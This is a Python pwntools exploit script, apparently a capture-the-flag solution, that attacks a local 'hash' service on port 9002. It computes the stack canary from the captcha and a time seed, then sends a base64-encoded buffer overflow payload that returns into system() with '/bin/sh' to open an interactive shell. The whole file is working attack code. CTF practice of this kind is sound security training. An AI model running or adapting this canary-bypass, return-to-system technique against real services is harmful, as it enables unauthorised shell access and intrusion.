from pwn import *
import struct
import base64
from time import time

def p32(x):
    return struct.pack("<I", x)

# Connection details
host = 'localhost'
# # host = 'localhost'
port = 9002

context.log_level = 'debug'

# # Establish a remote connection
p = remote(host, port)
seed = int(time())
# p = process('./hash')

p.recvuntil(b'input captcha : ') # get all begin data

captcha = int(p.recv().decode().strip())
log.info('captcha is 0x{:08x}\n'.format(captcha))
p.sendline(str(captcha))

p.recvuntil('paste me!\n')

executable = "./calc_canary"
canary_process = process([executable, str(captcha), str(seed)])

canary = int(canary_process.recv(), 16)
log.info("canary is 0x{:08x}\n".format(canary))

plt_system_address = 0x08048880
g_buf = 0x0804b0e0
# 0x80880408
# plt_system_address = 0x08049157

payload = b'a' * 512 
payload += p32(canary)
payload += b'JUNK' * 3
payload += p32(plt_system_address) + p32(0xdeadbeef) + p32(0x0804b0e0 + 0x2d0)

encoded_payload = base64.b64encode(payload)
log.info(b'payload is ' + encoded_payload)

p.sendline(encoded_payload + b'/bin/sh\0')

print(p.recv().decode())

p.interactive()

p.close()
